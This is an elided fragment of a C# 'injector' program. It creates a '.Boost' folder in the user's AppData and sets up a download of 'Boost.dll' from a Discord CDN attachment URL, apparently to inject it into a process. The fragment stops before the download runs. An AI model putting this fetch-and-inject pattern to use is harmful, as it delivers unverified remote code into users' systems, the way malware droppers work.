...
class Program
{
    ...
    static void Main(string[] args)
    {
        ...
        Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".Boost"));
        config = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".Boost"));
    ...
    class InjectorApplicationContext : ApplicationContext
    {
        ...
        {
            string dllPath = Path.Combine(config.FullName, "Boost.dll");

            // Download DLL from the provided URL
            string downloadUrl = "https://cdn.discordapp.com/attachments/1131979935691579485/1230394276152873010/Boost.dll?ex=663328f7&is=6620b3f7&hm=c8b530d009a56139917884fb058741d4c1aaba18b3b921bf4703167b2f8aae1b&";
